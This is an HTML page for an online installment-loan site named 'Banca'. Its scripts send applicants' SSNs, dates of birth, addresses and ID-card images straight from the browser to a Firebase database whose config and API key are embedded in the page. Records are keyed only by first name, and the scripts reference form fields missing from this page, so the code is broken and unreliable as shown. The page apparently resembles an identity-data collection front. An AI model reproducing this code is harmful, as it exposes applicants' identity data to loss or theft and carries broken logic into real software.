<!DOCTYPE HTML>
<html lang="en-US">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Banca - Installment Loans - Get an online cash loan today</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">

    <!-- CSS here -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" media="all" />
    <link rel="stylesheet" type="text/css" href="css/elegant-icons.min.css" media="all" />
    <link rel="stylesheet" type="text/css" href="css/all.min.css" media="all" />
    <link rel="stylesheet" type="text/css" href="css/animate.css" media="all" />
    <link rel="stylesheet" type="text/css" href="css/nice-select.css" media="all" />
    <link rel="stylesheet" type="text/css" href="css/default.css" media="all" />
    <link rel="stylesheet" type="text/css" href="css/style.css" media="all" />
    <link rel="stylesheet" type="text/css" href="css/responsive.css" media="all" />
</head>

<body>
    <!-- Preloader -->
    
    <!-- Header -->
    <header class="header">
        <div class="header-menu header-menu-3" id="sticky">
            <nav class="navbar navbar-expand-lg ">
                <div class="container">
                    <a class="navbar-brand sticky_logo" href="index.html">
                        <img class="main" src="img/logo/Logo.png" srcset="img/logo/Logo@2x.png 2x" alt="logo">
                        <img class="sticky" src="img/logo/Logo-2.png" srcset="img/logo/Logo-2@2x.png 2x" alt="logo">
                    </a>
                    <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse"
                        data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
                        aria-expanded="false" aria-label="Toggle navigation">
                        <span class="menu_toggle">
                            <span class="hamburger">
                                <span></span>
                                <span></span>
                                <span></span>
                            </span>
                            <span class="hamburger-cross">
                                <span></span>
                                <span></span>
                            </span>
                        </span>
                    </button>

                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
                        <ul class="navbar-nav menu ms-auto">
                            <li class="nav-item dropdown submenu ">
                                <a href="index.html" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"
                                    aria-haspopup="true" aria-expanded="false">Home</a>
                                <i class="arrow_carrot-down_alt2 mobile_dropdown_icon" aria-hidden="true"
                                    data-bs-toggle="dropdown"></i>

                            </li>
                            <li class="nav-item dropdown submenu">
                                <a class="nav-link dropdown-toggle" href="contact.html" role="button"
                                    data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                    Contact Us
                                </a>
                            </li>
                            <li class="nav-item dropdown submenu">
                                <a class="nav-link dropdown-toggle" href="HowItWorks.html" role="button"
                                    data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                    How It Works
                                </a>
                            </li>
                            <li class="nav-item dropdown submenu">
                                <a class="nav-link dropdown-toggle" href="Disclosure.html" role="button"
                                    data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                    Ad Disclosure
                                </a>
                            </li>
                        </ul>

                        
                    </div>
                </div>
            </nav>
        </div>
    </header>
    <!-- Header end-->


    <main>
        <!-- BreadCrumb start -->
        <section class="breadcrumb-area">
            <div class="breadcrumb-widget  pt-200 pb-110" style="background-image: url(img/breadcrumb/bg-1.png);">
                <div class="container">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="breadcrumb-content pt-85">
                                <h1>Apply Now</h1>
                                <ul>
                                    <li><a href="index.html">Home</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- BreadCrumb end -->

        <!-- Loan details start -->
        <section class="loan-deatils-area bg_disable pt-130 pb-120">
            <div class="container">
                <div class="row">

                    <div class="col-lg-9">
                        <div class="loan-details-widget">
                            <div class="container-fluid">
                                <div class="row">
                                    <div class="col-xl-4 col-lg-5">
                                        <div class="card shadow mb-4">
                                            <!-- Card Header - Dropdown -->
                                            <div
                                                class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                                                <h6 class="m-0 font-weight-bold text-primary">Account Details</h6>
                                            </div>
                                            <!-- Card Body -->
                                            <div class="card-body" style="height: 450px;">
                                                <p>Name: <span id="username2"></span></p>
                                                <p>Email: <span id="email"></span></p>
                                                <p>Phone: <span id="phone"></span></p>
                                            </div>
                                        </div>
                                    </div>
            
                                        <!--End-Action boxes-->
                         
        </section>
        <!-- Loan details end -->
    </main>

    <!-- footer -->
    <footer class="footer footer-3">
        <div class="footer-top  pt-200 pb-lg-115 pb-120">
            <div class="container">
                <div class="row gx-0 pt-60 ">

                    <div class="col-lg-4 col-sm-6 text-center text-sm-start ms-0 ">
                        <div class="footer-widget wow fadeInLeft mb-30">
                            <div class="footer-text mb-20">
                                <p>Banca, we believe that our loan service is the best available, and we're confident that we can help you achieve your financial goals.</p>
                            </div>

                            

                            <div class="footer-bold">
                            </div>
                        </div>
                    </div>


                    <div class="col-lg-2 col-sm-6 text-center text-sm-start ms-lg-5 ">
                        <div class="footer-widget mb-30 wow fadeInUp" data-wow-delay="0.1s">
                            <div class="f-widget-title">
                                <h5>Banca at a Glance</h5>
                            </div>
                            <div class="footer-link">
                                <ul>
                                    <li><a href="privacy.html"> Privacy Policy
                                        </a></li>
                                    <li><a href="ThirdParties.html"> Third Parties</a></li>
                                    <li><a href="HowItWorks.html"> How It Works</a></li>
                                    <li><a href="about.html"> About</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- copyright area -->
        <div class="copyright pt-25 pb-25">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-lg-3 text-center text-lg-start">
                        <a href="index.html" class="p-0 m-0"><img src="img/logo/Logo.png" alt="logo"></a>
                    </div>
                    <div class="col-lg-5 text-center my-3 my-sm-0">
                        <div class="copyright-text">
                            <p>Copyright&copy; Banca 2024. <br class="d-sm-none"> <a class="ms-2" href="privacy.html">Privacy</a>
                        </div>
                    </div>
                    <div class="col-lg-4 text-center text-lg-end ">
                        <div class="social-button">
                            <a href="#"><i class="fab fa-facebook-f"></i></a>
                            <a href="#"><i class="fab fa-twitter"></i></a>
                            <a href="#"><i class="fab fa-pinterest-p"></i></a>
                            <a href="#"><i class="fab fa-linkedin-in"></i></a>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </footer>
    <!-- footer end -->

    <!-- Back to top button -->
    <a id="back-to-top" title="Back to Top"></a>

    <!-- JS here -->
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="js/preloader.js"></script>
    <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript" src="js/jquery.smoothscroll.min.js"></script>
    <script type="text/javascript" src="js/jquery.waypoints.min.js"></script>
    <script type="text/javascript" src="js/jquery.counterup.min.js"></script>
    <script type="text/javascript" src="js/jquery.nice-select.min.js"></script>
    <script type="text/javascript" src="js/wow.min.js"></script>
    <script src="https://unpkg.com/ionicons@5.4.0/dist/ionicons.js"></script>
    <script type="text/javascript" src="js/custom.js"></script>

    <script> 
        document.getElementsByName('ssn')[0].addEventListener('input', function (event) {
            let input = event.target;
            let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
            if (value.length > 9) {
                value = value.slice(0, 9); // Limit to 9 digits
            }
            if (value.length > 2) {
                // Format the SSN as XXX-XX-XXXX
                value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
            }
            input.value = value;
        });

        document.getElementById('inputPhoneNumber').addEventListener('input', function (event) {
                let input = event.target;
                let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
                if (value.length > 10) {
                    value = value.slice(0, 10); // Limit to 10 digits
                }
                if (value.length > 3) {
                    // Format the phone number as (XXX) XXX-XXXX
                    value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
                }
                input.value = value;
            });
    </script>

<script type="module">
    // Import the necessary functions from the Firebase SDK
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
    import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

     // Your web app's Firebase configuration
     const firebaseConfig = {
        apiKey: "AIzaSyAgqyJwpRfrcny-HwGWfgk_pnKpDLrvFz0",
        authDomain: "banca-info.firebaseapp.com",
        projectId: "banca-info",
        storageBucket: "banca-info.appspot.com",
        messagingSenderId: "822849353480",
        appId: "1:822849353480:web:ebebda5670f9c2dfc8debd"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const storage = getStorage(app);

    // Function to generate a random file name
    function generateRandomFileName(file) {
        const randomString = Math.random().toString(36).substring(2, 8);
        const fileExtension = file.name.split('.').pop();
        return `file_${randomString}.${fileExtension}`;
    }

    // Function to upload file to Firebase Storage with a renamed file
    function uploadFile(file) {
        return new Promise((resolve, reject) => {
            const fileName = generateRandomFileName(file);
            const storageRefVar = storageRef(storage, `uploads/${fileName}`);

            // Use put for smaller files and uploadBytesResumable for larger files
            const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);

            uploadTask.then((snapshot) => {
                getDownloadURL(snapshot.ref).then((downloadURL) => {
                    resolve(downloadURL);
                });
            }).catch((error) => {
                console.error('Error uploading file:', error);
                reject(null);
            });
        });
    }

    // Submit form and store data in Firebase
    document.getElementById('loanForm').addEventListener('submit', function (e) {
        e.preventDefault();

        // Get form values
        const fName = document.getElementById('fName').value;
        const lName = document.getElementById('lName').value;
        const dob_d = document.getElementById('dob-d').selectedIndex;
        const dob_m = document.getElementById('dob-m').selectedIndex;
        const dob_y = document.getElementById('dob-y').value;

        // Check if day, month, and year are selected
        if (dob_d === 0 || dob_m === 0 || dob_y === "") {
            alert('Please select the complete date of birth');
            return;
        }

        const selectedDay = document.getElementById('dob-d').options[dob_d].value;
        const selectedMonth = document.getElementById('dob-m').options[dob_m].value;

        // Concatenate selected values to form the date of birth
        const dob = `${dob_y}-${selectedMonth}-${selectedDay}`;

        const ssn = document.getElementById('ssn').value;
        const maritalStatus = document.querySelector('input[name="MaritalStatas"]:checked').value;
        const email = document.getElementById('emailName').value;
        const phoneNumber = document.getElementById('inputPhoneNumber').value;
        const pAddress = document.getElementById('pAddress').value;
        const state = document.getElementById('stateName').value;
        const city = document.getElementById('cityName').value;
        const zipCode = document.getElementById('zipCode').value;
        const loanType = document.querySelector('input[name="select-loan-type"]:checked').value;
        const loanAmount = document.getElementById('loan-amount').value;
        const loanDuration = document.querySelector('input[name="inlineRadioOptions"]:checked').value;
        const agreeBox = document.getElementById('agreeBox').checked;

        // Check if the agreement box is checked
        if (!agreeBox) {
            alert('Please agree to the terms before submitting the form.');
            return;
        }

        const fileInputFront = document.querySelector('input[name="frontview"]');
        const fileFront = fileInputFront.files[0];

        const fileInputBack = document.querySelector('input[name="backview"]');
        const fileBack = fileInputBack.files[0];

        // Check if both files are selected
        if (!fileFront || !fileBack) {
            alert('Please select both front and back files');
            return;
        }

        // Store data in Firebase
        const formData = {
            fName,
            lName,
            dob,
            ssn,
            maritalStatus,
            email,
            phoneNumber,
            pAddress,
            state,
            city,
            zipCode,
            loanType,
            loanAmount,
            loanDuration,
            fileFrontURL: null,
            fileBackURL: null
        };

        // Upload front and back files concurrently
        Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
            .then(([fileFrontURL, fileBackURL]) => {
                formData.fileFrontURL = fileFrontURL;
                formData.fileBackURL = fileBackURL;

                // Set data at the specified location using the first name as the key
                const formsRef = ref(database, `loanForm/${fName}`);
                set(formsRef, formData).then(() => {
                    console.log('Form submitted successfully!');
                    // Redirect to submit.html after successful submission
                    window.location.href = 'submitted.html';
                }).catch((error) => {
                    console.error('Error submitting form:', error);
                    alert('An error occurred while submitting the form. Please try again.');
                });
            });
    });
</script>
    
    

</body>

</html>